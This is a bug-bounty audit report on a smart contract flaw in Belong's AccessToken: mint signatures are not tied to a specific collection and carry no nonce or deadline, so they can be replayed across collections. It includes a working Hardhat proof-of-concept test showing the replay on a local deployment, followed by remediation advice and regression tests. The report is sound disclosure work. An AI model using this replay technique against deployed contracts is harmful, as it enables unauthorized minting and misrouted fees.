# 56810 sc medium accesstoken cross contract signature replay allows unauthorized minting on other collections

**Submitted on Oct 20th 2025 at 21:18:48 UTC by @Queerantagonism for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #56810
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/belongnet/checkin-contracts/blob/main/contracts/v2/tokens/AccessToken.sol>
* **Impacts:**
  * Unauthorized minting of NFTs

## Description

* Primary affected files:
  * contracts/v2/tokens/AccessToken.sol
  * contracts/v2/utils/SignatureVerifier.sol (root cause)

Mint signatures used by AccessToken (both static and dynamic price flows) are not bound to the target collection contract.

The SignatureVerifier digests include only the chainId and payload fields, but omit the collection’s verifyingContract (address(this)) and lack nonce/deadline/used-hash replay protection.

As a result, any signature issued for Collection A by the backend signer can be replayed to mint on Collection B (sharing the same signer on the same chain), enabling unauthorized minting on the wrong collection.

## Impact

* Unauthorized minting of NFTs on collections that never authorized the mint.
* Circumvents backend curation and approvals.
* Mints NFTs in unintended collections, diluting supply and confusing provenance.
* Misattributes revenue (fees routed per the receiving collection, not the intended one).

Severity rationale: The bug allows minting NFTs in a collection that never authorized the mint; this is realistic when a platform reuses the same backend signer across collections and signatures are leaked or reused.

## What Makes This Exploitable?

* Factory configurations commonly use a single signer for multiple collections.
* AccessToken.validateSignature checks only Signer + chainId (via SignatureVerifier), not the collection address.
* No nonce, deadline, or used-hash prevents replay.
* The digest does not include address(this); a signature valid for A remains valid for B if both share the same backend signer and chainId. Because there is no nonce/deadline, it can be replayed indefinitely.

## Root Cause Analysis

Signature binding misses verifyingContract and replay controls.

In contracts/v2/utils/SignatureVerifier.sol:

* Static mints: checkStaticPriceParameters hashes: keccak256(abi.encodePacked( receiver, tokenId, tokenUri, whitelisted, block.chainid )) Missing: address(this), nonce, deadline, and used-digest tracking.
* Dynamic mints: checkDynamicPriceParameters hashes: keccak256(abi.encodePacked( receiver, tokenId, tokenUri, price, block.chainid )) Missing: address(this), nonce, deadline, and used-digest tracking.

In contracts/v2/tokens/AccessToken.sol:

* mintStaticPrice and mintDynamicPrice call the SignatureVerifier checks above and then mint. There is no additional binding to address(this) or replay guard.

Because the digest does not include the collection address, a signature valid for A remains valid for B if both share the same backend signer and chainId. Additionally, because there is no nonce/deadline, it can be replayed indefinitely.

## Attack Scenario

1. Platform deploys two collections A and B using the same signer S (common with a shared backend).
2. Backend signs a mint payload for A (static or dynamic).
3. An attacker or legitimate minter calls AccessTokenB.mint\*(…) providing that same signature.
4. Signature passes (signer + chainId), NFT is minted on B, even though B never authorized it.

Expected: A signature produced for a specific collection can only be used on that collection, once, before its deadline.\
Actual: The same signature can be re-used on any other collection with the same signer (and many times), enabling unauthorized mints.

## Proof of Concept

```typescript
import { expect } from "chai";
import { ethers } from "hardhat";
import { Wallet, Signature } from "ethers";

const NATIVE = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE";
const hashPacked = (types: string[], values: any[]) =>
  ethers.solidityPackedKeccak256(types as any, values as any);

describe("AccessToken cross-contract signature replay", function () {
  it("mints on B using signature intended for A", async function () {
    const [deployer, receiver] = await ethers.getSigners();
    const chainId = (await ethers.provider.getNetwork()).chainId;
    const backend = Wallet.createRandom().connect(ethers.provider);

    // Library
    const SigLibFactory = await ethers.getContractFactory("SignatureVerifier");
    const sigLib = await SigLibFactory.deploy();
    await sigLib.waitForDeployment();
    const sigLibAddr = await sigLib.getAddress();

    // AccessToken impl (link library)
    const ATImplFactory = await ethers.getContractFactory("AccessToken", {
      libraries: {
        "poc_contracts/v2/utils/SignatureVerifier.sol:SignatureVerifier":
          sigLibAddr,
      },
    });
    const atImpl = await ATImplFactory.deploy();
    await atImpl.waitForDeployment();
    const atImplAddr = await atImpl.getAddress();

    // MockFactory
    const MF = await ethers.getContractFactory("Factory");
    const mf = await MF.deploy({
      platformAddress: await deployer.getAddress(),
      signerAddress: await backend.getAddress(),
      defaultPaymentCurrency: NATIVE,
      platformCommission: 200n,
      maxArraySize: 100n,
      transferValidator: ethers.ZeroAddress,
    });
    await mf.waitForDeployment();
    const mfAddr = await mf.getAddress();

    // Two proxies A & B
    const Proxy = await ethers.getContractFactory("ERC1967Proxy");
    const iface = ATImplFactory.interface;

    const baseInfo = {
      paymentToken: NATIVE,
      feeNumerator: 0n,
      transferable: true,
      maxTotalSupply: ethers.MaxUint256,
      mintPrice: ethers.parseEther("0.001"),
      whitelistMintPrice: 0n,
      collectionExpire: 0n,
      metadata: { name: "", symbol: "" },
      contractURI: "",
      signature: "0x",
    };

    // --- Collection A ---
    const infoA = {
      ...baseInfo,
      metadata: { name: "COLA", symbol: "A" },
      contractURI: "ipfs://COLA",
    };
    const dataA = iface.encodeFunctionData("initialize", [
      {
        factory: mfAddr,
        creator: await deployer.getAddress(),
        feeReceiver: ethers.ZeroAddress,
        referralCode: ethers.ZeroHash,
        info: infoA,
      },
      ethers.ZeroAddress,
    ]);
    const proxyA = await Proxy.deploy(atImplAddr, dataA);
    await proxyA.waitForDeployment();
    const colA = await ethers.getContractAt(
      "AccessToken",
      await proxyA.getAddress()
    );

    // --- Collection B ---
    const infoB = {
      ...baseInfo,
      metadata: { name: "COLB", symbol: "B" },
      contractURI: "ipfs://COLB",
    };
    const dataB = iface.encodeFunctionData("initialize", [
      {
        factory: mfAddr,
        creator: await deployer.getAddress(),
        feeReceiver: ethers.ZeroAddress,
        referralCode: ethers.ZeroHash,
        info: infoB,
      },
      ethers.ZeroAddress,
    ]);
    const proxyB = await Proxy.deploy(atImplAddr, dataB);
    await proxyB.waitForDeployment();
    const colB = await ethers.getContractAt(
      "AccessToken",
      await proxyB.getAddress()
    );

    // --- Sign mint for A ---
    const tokenId = 1n;
    const tokenUriA = "ipfs://COLA/1";
    const whitelisted = false;

    const digestMintA = hashPacked(
      ["address", "uint256", "string", "bool", "uint256"],
      [await receiver.getAddress(), tokenId, tokenUriA, whitelisted, chainId]
    );

    const sigMintForA = Signature.from(
      backend.signingKey.sign(digestMintA)
    ).serialized;

    const paramsForA = [
      { tokenId, whitelisted, tokenUri: tokenUriA, signature: sigMintForA },
    ];
    const price = infoA.mintPrice;

    // --- Replay signature on B ⇒ unauthorized mint on B ---
    await expect(
      colB
        .connect(receiver)
        .mintStaticPrice(await receiver.getAddress(), paramsForA, NATIVE, price, {
          value: price,
        })
    ).to.not.be.reverted;
    expect(await colB.ownerOf(tokenId)).to.equal(await receiver.getAddress());

    // --- (optional) same signature mints on A ---
    await expect(
      colA
        .connect(receiver)
        .mintStaticPrice(await receiver.getAddress(), paramsForA, NATIVE, price, {
          value: price,
        })
    ).to.not.be.reverted;
    expect(await colA.ownerOf(tokenId)).to.equal(await receiver.getAddress());
  });
});
```

Run Commands

yarn hardhat clean --config ./hardhat.poc.config.ts && yarn hardhat compile --config ./hardhat.poc.config.ts && yarn hardhat test --config ./hardhat.poc.config.ts --grep "AccessToken cross-contract signature replay" test/poc\_access\_token\_replay.spec.ts

The test passes with both cases:

* colB.mintStaticPrice succeeds using a signature “for A” ⇒ unauthorized mint on B.
* colA.mintStaticPrice also succeeds with the same signature.

## Remediation

* Switch to EIP-712 typed data:
  * Domain: { name, version, chainId, verifyingContract }
  * Types: MintStatic / MintDynamic with nonce & deadline
  * Verify against EIP-712 digest and mark usedDigest.
* Replace abi.encodePacked with abi.encode (or hash dynamic fields) to avoid encoding ambiguity.
* Include verifyingContract (address(this)) in the digest and implement replay protections (nonce, deadline, used-digest tracking).

## Regression Tests to Add

* Negative: Signature for A must fail on B (binding to verifyingContract).
* Negative: Reuse of the same signature on A must fail (usedDigest consumed).
* Negative: Expired signature must fail (deadline in the past).
* Positive: Fresh signature for A must succeed once.
